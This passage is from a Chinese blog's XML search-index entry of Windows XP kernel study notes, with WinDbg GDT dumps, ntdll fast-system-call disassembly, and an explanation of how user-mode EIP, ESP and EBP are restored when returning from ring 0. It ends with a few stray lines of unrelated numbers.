<td>R3：<br />CS3 &#x3D; GDT_CS + 16，–&gt; Index &#x3D; 3，GDT_CS3 &#x3D; 00cffb00`0000ffff。<br />SS3 &#x3D; GDT_CS + 24，–&gt; Index &#x3D; 4，GDT_SS3 &#x3D; 00cff300&#96;0000ffff。</td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">8003f</span>000</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>000</span><br><span class="line"><span class="number">8003f</span>000  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>010  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>020  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>04`<span class="number">200020</span>ab</span><br><span class="line"><span class="number">8003f</span>030  ffc093df`f0000001 <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">8003f</span>040  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure>



<p>1、需要解释下快速调用缺少的如下在<code>KiSystemService</code>的两句：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A492                 mov     ebx, [esi+_KTHREAD.TrapFrame]</span><br><span class="line">.text:<span class="number">0046</span>A498                 mov     [ebp+_KTRAP_FRAME._Edx], ebx</span><br></pre></td></tr></table></figure>

<p>2、快速调用返回函数<code>KiFastSystemCallRet</code>是紧跟在<code>KiFastSystemCall</code>之后的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u <span class="number">0x7c92e4f0</span></span><br><span class="line">ntdll!KiFastSystemCall:</span><br><span class="line"><span class="number">7</span>c92e4f0 <span class="number">8b</span>d4            mov     edx,esp</span><br><span class="line"><span class="number">7</span>c92e4f2 <span class="number">0f</span>34            sysenter</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line"><span class="number">7</span>c92e4f4 c3              ret</span><br><span class="line"><span class="number">7</span>c92e4f5 <span class="number">8</span>da42400000000  lea     esp,[esp]</span><br><span class="line"><span class="number">7</span>c92e4fc <span class="number">8</span>d642400        lea     esp,[esp]</span><br><span class="line">ntdll!KiIntSystemCall:</span><br><span class="line"><span class="number">7</span>c92e500 <span class="number">8</span>d542408        lea     edx,[esp+<span class="number">8</span>]</span><br><span class="line"><span class="number">7</span>c92e504 cd2e            <span class="keyword">int</span>     <span class="number">2</span>Eh</span><br><span class="line"><span class="number">7</span>c92e506 c3              ret</span><br><span class="line">  </span><br><span class="line">kd&gt; u <span class="number">0x7c92e4f4</span></span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line"><span class="number">7</span>c92e4f4 c3              ret</span><br><span class="line"><span class="number">7</span>c92e4f5 <span class="number">8</span>da42400000000  lea     esp,[esp]</span><br><span class="line"><span class="number">7</span>c92e4fc <span class="number">8</span>d642400        lea     esp,[esp]</span><br><span class="line">ntdll!KiIntSystemCall:</span><br><span class="line"><span class="number">7</span>c92e500 <span class="number">8</span>d542408        lea     edx,[esp+<span class="number">8</span>]</span><br><span class="line"><span class="number">7</span>c92e504 cd2e            <span class="keyword">int</span>     <span class="number">2</span>Eh</span><br><span class="line"><span class="number">7</span>c92e506 c3              ret</span><br><span class="line"><span class="number">7</span>c92e507 <span class="number">90</span>              nop</span><br><span class="line">ntdll!RtlRaiseException:</span><br><span class="line"><span class="number">7</span>c92e508 <span class="number">55</span>              push    ebp</span><br></pre></td></tr></table></figure>

<p>3、好好解释一下快速返回<code>KiFastSystemCallRet</code>的<code>ret</code>实际就是弹出<code>NtReadVirtualMemory</code>的返回地址去执行。</p>
<p><img data-src="https://s2.loli.net/2022/07/24/Ubly9KWi4u8sAN3.png" alt="53.png"></p>
<h3 id="6-3-0环的返回3环寄存器"><a href="#6-3-0环的返回3环寄存器" class="headerlink" title="6.3 0环的返回3环寄存器"></a>6.3 0环的返回3环寄存器</h3><p>从0环返回三环，最重要的是找到 <strong>EIP3</strong>、<strong>ESP3</strong>、<strong>EBP3</strong>的位置。</p>
<p>两种返回方式：<strong>iretd</strong>、<strong>sysexit</strong>。</p>
<ol>
<li><mark class="label danger">常规方式</mark> ：系统调用返回

<ul>
<li><p><strong>进入0环时</strong></p>
<ul>
<li><p>ESP3：TRAP_FRAME.HardwareSegEsp &#x3D;  edx，第二个返回地址（KiFastCallEntry）</p>
</li>
<li><p>EIP3：KTRAP_FRAME.Eip &#x3D; _KUSER_SHARED_DATA.SystemCallReturn（KiFastCallEntry）</p>
</li>
<li><p>EBP3：TRAP_FRAME.Ebp &#x3D; ebp （KiFastCallEntry）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A539		push edx		<span class="comment">//HardwareSegEsp = esp3 == 3环的第二个返回地址</span></span><br><span class="line">...<span class="comment">//eip3</span></span><br><span class="line">.text:<span class="number">0046</span>A548		push dword ptr ds:<span class="number">0F</span>FDF0304h</span><br><span class="line">...<span class="comment">//ebp3</span></span><br><span class="line">.text:<span class="number">0046</span>A550		push ebp</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>退出0环时</strong></p>
<ul>
<li><p>ESP3：ecx</p>
</li>
<li><p>EIP3：edx</p>
</li>
<li><p>EBP3：ebp</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//KiSystemCallExit2</span></span><br><span class="line">.text:<span class="number">0046</span>A732		pop ecx		<span class="comment">//ecx = TrapFrame.HardwareSegEsp, sysexit --&gt; esp3 = ecx</span></span><br><span class="line">...<span class="comment">//KiSystemCallExit2</span></span><br><span class="line">.text:<span class="number">0046</span>A728		pop edx		<span class="comment">//edx = TrapFrame.Eip, sysexit --&gt; eip3 = edx</span></span><br><span class="line">...<span class="comment">//KiServiceExit</span></span><br><span class="line">.text:<span class="number">0046</span>A700		pop ebp		<span class="comment">//ebp = TrapFrame.Ebp, sysexit 不改变Ebp</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><mark class="label success">APC返回</mark>

<ul>
<li><strong>进入0环时</strong>：使用常规调用</li>
<li><strong>退出0环前</strong>：在执行到常规退出之前，修改TrapFrame<ul>
<li>ESP3：在<code>KiFastSystemCallRet</code>函数里构造<code>sizeof(CONTEXT) + 0x10 == 0x2DC</code>，然后将这时3环的地址赋给TrapFrame.HardwareSegEsp（KiInitializeUserApc）。</li>
<li>EIP3：TrapFrame.Eip &#x3D; KeUserApcDispatcher（KiInitializeUserApc）。</li>
<li>EBP3：在KiInitializeUserApc中没有处理，使用默认值。</li>
</ul>
</li>
<li><strong>退出0环时</strong>：使用常规调用</li>
</ul>
</li>
<li><mark class="label primary">用户异常返回</mark>（使用sysenter方式，非中断进入0环）

<ul>
<li><strong>进入0环时</strong>：使用常规调用</li>
<li><strong>退出0环前</strong>：在执行到常规退出之前，修改TrapFrame<ul>
<li>ESP3：在<code>KiDispatchException--KiEspToTrapFrame</code>函数里赋值给TrapFrame.HardwareSegEsp，此时的Eip3指向<code>KiUserExceptionDispatcher</code>函数的栈顶（参数1、2，EXCEPTION_RECORD，CONTEXT）。</li>
<li>EIP3：TrapFrame.Eip &#x3D; KeUserExceptionDispatcher（KiDispatchException）。</li>
<li>EBP3：在KiDispatchException中没有处理，使用默认值。</li>
</ul>
</li>
<li><strong>退出0环时</strong>：使用常规调用</li>
</ul>
</li>
</ol>
<h2 id="7-API前缀"><a href="#7-API前缀" class="headerlink" title="7 API前缀"></a>7 API前缀</h2><p><img data-src="https://i.loli.net/2021/05/26/f6z1tYC8iWxBM4v.png" alt="12.png"></p>
<p>21      22     23   24   25   26 年</p>
<p>25     26      27   28   29   30</p>
<p>b-      b-      b-     b     b-    b-</p>
<p>​         15              20            30     </p>
<p>45 60</p>
<p>20*1.3 &#x3D; 26</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>API调用</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
        <tag>系统调用</tag>
        <tag>API调用</tag>
      </tags>
  </entry>
</search>
